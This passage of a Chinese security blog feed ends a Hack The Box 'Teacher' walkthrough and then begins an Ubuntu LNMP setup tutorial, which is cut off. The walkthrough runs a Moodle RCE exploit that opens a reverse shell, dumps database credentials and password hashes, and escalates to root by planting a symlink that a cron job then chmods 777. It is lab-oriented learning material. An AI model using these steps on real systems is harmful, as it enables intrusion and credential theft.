2020-03-22 03:27:50 (GMT-4) (2289 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<p>主要是有两个文件值得注意：</p>
<ul>
<li><code>/moodle/config.php</code></li>
<li><code>/moodle/INSTALL.txt</code></li>
</ul>
<p>config配置文件之后会用到，而INSTALL文件告诉了我们当前moodle的版本是3.2。</p>
<p>搜一下moodle相关的漏洞：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322164229.png" alt=""></p>
<p>试一下<code>Moodle 3.4.1 - Remote Code Execute</code>的利用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo php 46551.php url&#x3D;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; user&#x3D;giovanni pass&#x3D;Th4C00lTheacha# ip&#x3D;10.10.16.89 port&#x3D;4444 course&#x3D;2</span><br><span class="line"></span><br><span class="line">*------------------------------*</span><br><span class="line">* Noodle [Moodle RCE] (v3.4.1) *</span><br><span class="line">*------------------------------*</span><br><span class="line"></span><br><span class="line">[!] Make sure you have a listener</span><br><span class="line">[!] at 10.10.16.89:4444</span><br><span class="line"></span><br><span class="line">[*] Logging in as user giovanni with password Th4C00lTheacha# </span><br><span class="line">[+] Successful Login</span><br><span class="line">[&gt;] Moodle Session q86b6t60vldlqjk0gp90u5mat0 </span><br><span class="line">[&gt;] Moodle Key N25C2hyBzu </span><br><span class="line">[*] Loading Course ID 2 </span><br><span class="line">[+] Successfully Loaded Course</span><br><span class="line">[*] Enable Editing</span><br><span class="line">[+] Successfully Enabled Course Editing</span><br><span class="line">[*] Adding Quiz</span><br><span class="line">[+] Successfully Added Quiz</span><br><span class="line">[*] Configuring New Quiz</span><br><span class="line">[+] Successfully Configured Quiz</span><br><span class="line">[*] Loading Edit Quiz Page </span><br><span class="line">[+] Successfully Loaded Edit Quiz Page</span><br><span class="line">[*] Adding Calculated Question </span><br><span class="line">[+] Successfully Added Calculation Question</span><br><span class="line">[*] Adding Evil Question </span><br><span class="line">[+] Successfully Created Evil Question</span><br><span class="line">[*] Sending Exploit</span><br><span class="line"></span><br><span class="line">[&gt;] You should receive a reverse shell attempt from the target at 10.10.16.89 on port 4444 </span><br><span class="line">[&gt;] If connection was successful this program will wait here until you close the connection.</span><br><span class="line">[&gt;] You should be able to Ctrl+C and retain the connection through netcat.</span><br></pre></td></tr></table></figure>
<p>本机监听4444端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 4444                                                                                 listening on [any] 4444 ...                                                                     10.10.10.153: inverse host lookup failed: Unknown host                                           connect to [10.10.16.89] from (UNKNOWN) [10.10.10.153] 42232                                    &#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off                                             $ python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;                                                 www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;question$ id                                               id                                                                                               uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<p>查看<code>config.php</code>网站文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle$ cat config.php</span><br><span class="line">cat config.php</span><br><span class="line">&lt;?php  &#x2F;&#x2F; Moodle configuration file</span><br><span class="line"></span><br><span class="line">unset($CFG);</span><br><span class="line">global $CFG;</span><br><span class="line">$CFG &#x3D; new stdClass();</span><br><span class="line"></span><br><span class="line">$CFG-&gt;dbtype    &#x3D; &#39;mariadb&#39;;</span><br><span class="line">$CFG-&gt;dblibrary &#x3D; &#39;native&#39;;</span><br><span class="line">$CFG-&gt;dbhost    &#x3D; &#39;localhost&#39;;</span><br><span class="line">$CFG-&gt;dbname    &#x3D; &#39;moodle&#39;;</span><br><span class="line">$CFG-&gt;dbuser    &#x3D; &#39;root&#39;;</span><br><span class="line">$CFG-&gt;dbpass    &#x3D; &#39;Welkom1!&#39;;</span><br><span class="line">$CFG-&gt;prefix    &#x3D; &#39;mdl_&#39;;</span><br><span class="line">$CFG-&gt;dboptions &#x3D; array (</span><br><span class="line">  &#39;dbpersist&#39; &#x3D;&gt; 0,</span><br><span class="line">  &#39;dbport&#39; &#x3D;&gt; 3306,</span><br><span class="line">  &#39;dbsocket&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">  &#39;dbcollation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$CFG-&gt;wwwroot   &#x3D; &#39;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#39;;</span><br><span class="line">$CFG-&gt;dataroot  &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;moodledata&#39;;</span><br><span class="line">$CFG-&gt;admin     &#x3D; &#39;admin&#39;;</span><br><span class="line"></span><br><span class="line">$CFG-&gt;directorypermissions &#x3D; 0777;</span><br><span class="line"></span><br><span class="line">require_once(__DIR__ . &#39;&#x2F;lib&#x2F;setup.php&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; There is no php closing tag in this file,</span><br><span class="line">&#x2F;&#x2F; it is intentional because it prevents trailing whitespace problems!</span><br></pre></td></tr></table></figure>
<p>这里列出了MySQL数据库的登录用户名和密码：<code>root</code>和<code>Welkom1!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ mysql -u root -p                                           mysql -u root -p                                                                                 Enter password: Welkom1!                                                                         Welcome to the MariaDB monitor.  Commands end with ; or \g.                                    Your MariaDB connection id is 949                                                               Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1                                             Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.                             Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line">......</span><br><span class="line">MariaDB [moodle]&gt; select username, password from mdl_user;</span><br><span class="line">select username, password from mdl_user;</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">| username    | password                                                     |</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |</span><br><span class="line">| admin       | $2y$10$7VPsdU9&#x2F;9y2J4Mynlt6vM.a4coqHRXsNTOq&#x2F;1aA6wCWTsF2wtrDO2 |</span><br><span class="line">| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf&#x2F;M1Zkj&#x2F;i1VqLO0FSYO |</span><br><span class="line">| Giovannibak | 7a860966115182402ed06375cf0a22af                             |</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>查看那一串数字的加密方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hash-identifier 7a860966115182402ed06375cf0a22af</span><br><span class="line">   #########################################################################</span><br><span class="line">   #     __  __                     __           ______    _____           #</span><br><span class="line">   #    &#x2F;\ \&#x2F;\ \                   &#x2F;\ \         &#x2F;\__  _\  &#x2F;\  _ &#96;\         #</span><br><span class="line">   #    \ \ \_\ \     __      ____ \ \ \___     \&#x2F;_&#x2F;\ \&#x2F;  \ \ \&#x2F;\ \        #</span><br><span class="line">   #     \ \  _  \  &#x2F;&#39;__&#96;\   &#x2F; ,__\ \ \  _ &#96;\      \ \ \   \ \ \ \ \       #</span><br><span class="line">   #      \ \ \ \ \&#x2F;\ \_\ \_&#x2F;\__, &#96;\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br><span class="line">   #       \ \_\ \_\ \___ \_\&#x2F;\____&#x2F;  \ \_\ \_\     &#x2F;\_____\ \ \____&#x2F;      #</span><br><span class="line">   #        \&#x2F;_&#x2F;\&#x2F;_&#x2F;\&#x2F;__&#x2F;\&#x2F;_&#x2F;\&#x2F;___&#x2F;    \&#x2F;_&#x2F;\&#x2F;_&#x2F;     \&#x2F;_____&#x2F;  \&#x2F;___&#x2F;  v1.2 #</span><br><span class="line">   #                                                             By Zion3R #</span><br><span class="line">   #                                                    www.Blackploit.com #</span><br><span class="line">   #                                                   Root@Blackploit.com #</span><br><span class="line">   #########################################################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure>
<p><code>7a860966115182402ed06375cf0a22af</code>md5解密</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322203948.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ su giovanni</span><br><span class="line">su giovanni</span><br><span class="line">Password: expelled</span><br><span class="line"></span><br><span class="line">giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(giovanni) gid&#x3D;1000(giovanni) groups&#x3D;1000(giovanni)</span><br><span class="line">giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ls &#x2F;home&#x2F;giovanni&#x2F;  </span><br><span class="line">ls &#x2F;home&#x2F;giovanni&#x2F;</span><br><span class="line">user.txt  work</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">giovanni@teacher:~&#x2F;work$ ls -lR</span><br><span class="line">ls -lR</span><br><span class="line">.:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses</span><br><span class="line">drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp</span><br><span class="line"></span><br><span class="line">.&#x2F;courses:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jun 27  2018 algebra</span><br><span class="line"></span><br><span class="line">.&#x2F;courses&#x2F;algebra:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp:</span><br><span class="line">total 8</span><br><span class="line">-rwxrwxrwx 1 root root  256 Mar 22 16:08 backup_courses.tar.gz</span><br><span class="line">drwxrwxrwx 3 root root 4096 Jun 27  2018 courses</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp&#x2F;courses:</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx 2 root root 4096 Jun 27  2018 algebra</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp&#x2F;courses&#x2F;algebra:</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra</span><br><span class="line">giovanni@teacher:~&#x2F;work$ date</span><br><span class="line">date</span><br><span class="line">Sun Mar 22 16:08:17 CET 2020</span><br></pre></td></tr></table></figure>
<p>我们可以发现<code>/tmp/backup_courses.tar.gz</code>的时间就是当前的时间，猜测这应该是一个定时任务。</p>
<p>定时任务的脚本位于<code>/usr/bin/backup.sh</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;giovanni&#x2F;work;</span><br><span class="line">tar -czvf tmp&#x2F;backup_courses.tar.gz courses&#x2F;*;</span><br><span class="line">cd tmp;</span><br><span class="line">tar -xf backup_courses.tar.gz;</span><br><span class="line">chmod 777 * -R;</span><br></pre></td></tr></table></figure>
<p>我门只需要看到这个脚本执行后<code>~/tmp</code>目录下的所有文件或文件夹的权限变成了777，那么现在就很容易了，在tmp目录下新建一个根目录的软连接即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ln -s &#x2F; ca01h</span><br><span class="line">ln -s &#x2F; ca01h</span><br><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;</span><br><span class="line">ls -la &#x2F;</span><br><span class="line">total 84</span><br><span class="line">drwxrwxrwx 22 root root  4096 Oct 28  2018 .</span><br><span class="line">drwxrwxrwx 22 root root  4096 Oct 28  2018 ..</span><br><span class="line">drwxrwxrwx  2 root root  4096 Oct 28  2018 bin</span><br><span class="line">drwxrwxrwx  3 root root  4096 Oct 28  2018 boot</span><br><span class="line">drwxrwxrwx 17 root root  3080 Mar 22 05:06 dev</span><br><span class="line">drwxrwxrwx 84 root root  4096 Oct 28  2018 etc</span><br><span class="line">drwxrwxrwx  3 root root  4096 Jun 27  2018 home</span><br><span class="line">lrwxrwxrwx  1 root root    29 Oct 28  2018 initrd.img -&gt; boot&#x2F;initrd.img-4.9.0-8-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    29 Oct 28  2018 initrd.img.old -&gt; boot&#x2F;initrd.img-4.9.0-6-amd64</span><br><span class="line">drwxrwxrwx 15 root root  4096 Jun 27  2018 lib</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 lib64</span><br><span class="line">drwxrwxrwx  2 root root 16384 Jun 27  2018 lost+found</span><br><span class="line">drwxrwxrwx  3 root root  4096 Jun 27  2018 media</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 mnt</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 opt</span><br><span class="line">drwxrwxrwx 93 root root     0 Mar 22 05:06 proc</span><br><span class="line">drwxrwxrwx  3 root root  4096 Nov  4  2018 root</span><br><span class="line">drwxrwxrwx 18 root root   500 Mar 22 05:06 run</span><br><span class="line">drwxrwxrwx  2 root root  4096 Oct 28  2018 sbin</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 srv</span><br><span class="line">drwxrwxrwx 13 root root     0 Mar 22 16:19 sys</span><br><span class="line">drwxrwxrwx  2 root root  4096 Mar 22 06:26 tmp</span><br><span class="line">drwxrwxrwx 10 root root  4096 Jun 27  2018 usr</span><br><span class="line">drwxrwxrwx 12 root root  4096 Jun 27  2018 var</span><br><span class="line">lrwxrwxrwx  1 root root    26 Oct 28  2018 vmlinuz -&gt; boot&#x2F;vmlinuz-4.9.0-8-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    26 Oct 28  2018 vmlinuz.old -&gt; boot&#x2F;vmlinuz-4.9.0-6-amd64</span><br><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;root&#x2F;root.txt</span><br><span class="line">ls -la &#x2F;root&#x2F;root.txt</span><br><span class="line">-rwxrwxrwx 1 root root 33 Jun 27  2018 &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<h2 id="0x04-CVE-Analysis">0x04 CVE Analysis</h2>
<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p>
<h2 id="0x05-Conclusion">0x05 Conclusion</h2>
<p>渗透过程：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322233257.png" alt=""></p>
<h2 id="0x06-Reference">0x06 Reference</h2>
<p><a href="https://ech1.netlify.com/htb/easy/26">https://ech1.netlify.com/htb/easy/26</a></p>
<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之Ubuntu18.04安装LNMP</title>
    <url>/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP/</url>
    <content><![CDATA[<h2 id="本周目标">本周目标</h2>
<ul>
<li>任务目标：准备学习环境，搭建Web服务器，并做相应的服务器加固学习</li>
<li>推荐环境：linux+nginx+php-fpm+mysql</li>
<li>预期结果：能够运行 php 代码并且可以使用 php 连接 mysql，成功执行 mysql 的语句</li>
<li>拓展实验：可以搭建基于 Apache 的环境、基于 Windows Server 的 IIS 环境等</li>
</ul>
<h2 id="基本环境">基本环境</h2>
<ul>
<li>VMware Workstation Player 15</li>
<li>Ubuntu 18.04.2 LTS</li>
</ul>
<h2 id="环境搭建">环境搭建</h2>
<h3 id="安装Nginx">安装Nginx</h3>
<ol>
<li>
<h5 id="Install-Nginx">Install Nginx</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>
<p>使用下面命令查看是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service nginx status</span><br></pre></td></tr></table></figure>
<p>如果Nginx启动成功，会有如下显示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">● nginx.service - A high performance web server and a reverse proxy server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: en</span><br><span class="line">   Active: active (running) since Sat 2019-07-27 13:12:44 CST; 39s ago</span><br><span class="line">     Docs: man:nginx(8)</span><br><span class="line"> Main PID: 5836 (nginx)</span><br><span class="line">    Tasks: 2 (<span class="built_in">limit</span>: 3433)</span><br><span class="line">   CGroup: /system.slice/nginx.service</span><br><span class="line">           ├─5836 nginx: master process /usr/sbin/nginx -g daemon on; master_pro</span><br><span class="line">           └─5837 nginx: worker process</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-Firewall">Configure Firewall</h5>
<blockquote>
<p><a href="https://help.ubuntu.com/lts/serverguide/firewall.html">ubuntu官方文档</a>有对ufw进行简单的介绍</p>
</blockquote>
<p>配置ufw允许ssh、http、https连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh</span><br><span class="line">sudo ufw allow http</span><br><span class="line">sudo ufw allow https</span><br></pre></td></tr></table></figure>
<p>启动ufw：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>
<p>使用下面命令检查防火墙状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw status</span><br><span class="line"></span><br><span class="line">Status: active</span><br><span class="line"></span><br><span class="line">To                         Action      From</span><br><span class="line">--                         ------      ----</span><br><span class="line">22/tcp                     ALLOW       Anywhere                  </span><br><span class="line">80/tcp                     ALLOW       Anywhere                  </span><br><span class="line">443/tcp                    ALLOW       Anywhere                  </span><br><span class="line">22/tcp (v6)                ALLOW       Anywhere (v6)             </span><br><span class="line">80/tcp (v6)                ALLOW       Anywhere (v6)             </span><br><span class="line">443/tcp (v6)               ALLOW       Anywhere (v6)  </span><br></pre></td></tr></table></figure>
<p>在这里，可以看到端口22（SSH），80（https）和443（https）对IPv4和IPv6都是开放的。</p>
<blockquote>
<p>centos7 firewalld操作：</p>
<p>添加</p>
<p>firewall-cmd --zone=public --add-port=80/tcp --permanent  （–permanent永久生效，没有此参数重启后失效）</p>
<p>重新载入</p>
<p>firewall-cmd --reload</p>
<p>查看</p>
<p>firewall-cmd --zone=public --query-port=80/tcp</p>
<p>删除</p>
<p>firewall-cmd --zone=public --remove-port=80/tcp --permanent</p>
<p>查看所有开放的端口</p>
<p>firewall-cmd --zone=public --list-ports</p>
</blockquote>
</li>
<li>
<h5 id="Test-Nginx">Test Nginx</h5>
<p>使用<code>ifconfig</code>查看本机IP地址<code>192.168.11.131</code></p>
<p>在浏览器中访问本机IP地址<code>http://192.168.11.131/</code>：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5echydw86j20l00dr0tf.jpg" alt=""></p>
</li>
</ol>
<h3 id="安装MySQL">安装MySQL</h3>
<ol>
<li>
<h5 id="Install-MySQL">Install MySQL</h5>
<p>输入以下命令安装MySQL：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mysql-server</span><br></pre></td></tr></table></figure>
<p>可以按如下方式测试MySQL服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mysql</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 2</span><br><span class="line">Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-MySQL-Security">Configure MySQL Security</h5>
<p>默认情况下，MySQL服务器只有一个用户：<code>root</code>。如果您是Linux系统上的root用户<em>并</em>执行<code>mysql</code>命令，则只能使用此用户登录数据库，无需输入密码，也不需要输入密码。</p>
<p>为了确保安装，MySQL附带了一个脚本，该脚本将询问我们是否要修改一些不安全的默认值。键入以下命令启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>
<p>此脚本将询问您是否要配置<code>VALIDATE PASSWORD PLUGIN</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ca0y1h@ubuntu18042:~$ sudo mysql_secure_installation</span><br><span class="line"></span><br><span class="line">Securing the MySQL server deployment.</span><br><span class="line"></span><br><span class="line">Connecting to MySQL using a blank password.</span><br><span class="line"></span><br><span class="line">VALIDATE PASSWORD PLUGIN can be used to <span class="built_in">test</span> passwords</span><br><span class="line">and improve security. It checks the strength of password</span><br><span class="line">and allows the users to <span class="built_in">set</span> only those passwords <span class="built_in">which</span> are</span><br><span class="line">secure enough. Would you like to setup VALIDATE PASSWORD plugin?</span><br><span class="line"></span><br><span class="line">Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No:</span><br></pre></td></tr></table></figure>
<p>输入<code>y</code>，接下来脚本还会要求你选择密码验证级别：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">There are three levels of password validation policy:</span><br><span class="line"></span><br><span class="line">LOW    Length &gt;= 8</span><br><span class="line">MEDIUM Length &gt;= 8, numeric, mixed <span class="keyword">case</span>, and special characters</span><br><span class="line">STRONG Length &gt;= 8, numeric, mixed <span class="keyword">case</span>, special characters and dictionary file</span><br><span class="line"></span><br><span class="line">Please enter 0 = LOW, 1 = MEDIUM and 2 = STRONG:</span><br></pre></td></tr></table></figure>
<p>输入<code>1</code>选择中等密码强度，接下来，系统会要求您提交并确认root密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">New password: </span><br><span class="line"></span><br><span class="line">Re-enter new password: </span><br><span class="line"></span><br><span class="line">Estimated strength of the password: 100 </span><br><span class="line">Do you wish to <span class="built_in">continue</span> with the password provided?(Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br></pre></td></tr></table></figure>
<p>接下来MySQL脚本将删除一些匿名用户和测试数据库，禁用远程root登录，并加载这些新规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">By default, a MySQL installation has an anonymous user,</span><br><span class="line">allowing anyone to <span class="built_in">log</span> into MySQL without having to have</span><br><span class="line">a user account created <span class="keyword">for</span> them. This is intended only <span class="keyword">for</span></span><br><span class="line">testing, and to make the installation go a bit smoother.</span><br><span class="line">You should remove them before moving into a production</span><br><span class="line">environment.</span><br><span class="line"></span><br><span class="line">Remove anonymous users? (Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br><span class="line">Success.</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">By default, MySQL comes with a database named <span class="string">&#x27;test&#x27;</span> that</span><br><span class="line">anyone can access. This is also intended only <span class="keyword">for</span> testing,</span><br><span class="line">and should be removed before moving into a production</span><br><span class="line">environment.</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">Reloading the privilege tables will ensure that all changes</span><br><span class="line">made so far will take effect immediately.</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? (Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br><span class="line">Success.</span><br><span class="line"></span><br><span class="line">All <span class="keyword">done</span>! </span><br></pre></td></tr></table></figure>
<p>最后需要注意的是，在运行MySQL 5.7（及更高版本）的Ubuntu系统中，如果是以root身份用户启动<code>mysql</code>命令时，根MySQL用户设置为<code>auth_socket</code>默认使用插件进行身份验证，而不是使用密码进行身份验证。如果需要允许外部程序（例如phpMyAdmin）访问用户时，会出现访问受限的情况。</p>
<p>这样就需要将其身份验证方法从切换<code>auth_socket</code>为<code>mysql_native_password</code>，使用以下命令检查每个MySQL用户帐户使用的身份验证方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             |                                           | auth_socket           | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *A38295EEEA729FDFC0C36C8E270DDA27005B7693 | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>运行以下<code>ALTER USER</code>命令，更改<code>password</code>为上述步骤选择的强密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后，运行<code>FLUSH PRIVILEGES</code>告诉服务器重新加载授权表并使新的更改生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>配置根MySQL用户使用密码进行身份验证后，将无法再<code>sudo mysql</code>使用先前使用的命令访问MySQL 。相反，必须运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<p>输入刚刚设置的密码后，将看到MySQL提示符。</p>
<p>此时，数据库系统现已设置完毕，接下来继续安装PHP。</p>
</li>
</ol>
<h3 id="安装PHP-配置Nginx">安装PHP&amp;配置Nginx</h3>
<ol>
<li>
<h5 id="Install-php-fpm">Install php-fpm</h5>
<p>与Apache不同，Nginx不包含本地PHP处理。为此，我们必须安装PHP-FPM（FastCGI Process Manager）。FPM是另一种PHP FastCGI实现，具有一些对重载站点有用的附加功能。另外还需要安装php-mysql以允许PHP与MySQL数据库通信。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install php-fpm php-mysql</span><br></pre></td></tr></table></figure>
<p>查看PHP是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ php --version</span><br><span class="line">PHP 7.2.19-0ubuntu0.18.04.1 (cli) (built: Jun  4 2019 14:48:12) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.19-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-Nginx-for-PHP">Configure Nginx for PHP</h5>
<p>现在已经安装了所有必需的LEMP堆栈组件，但仍需要进行一些Nginx配置更改。这是在服务器块级别完成的（服务器块类似于Apache的虚拟主机）。</p>
<p>在<code>/etc/nginx/sites-available/</code>目录中打开新的服务器块配置文件。在此示例中，新服务器块配置文件命名<code>example.com</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/nginx/sites-available/example.com</span><br></pre></td></tr></table></figure>
<p>将以下内容（从默认服务器块配置文件中获取并略微修改）添加到新服务器块配置文件中：</p>
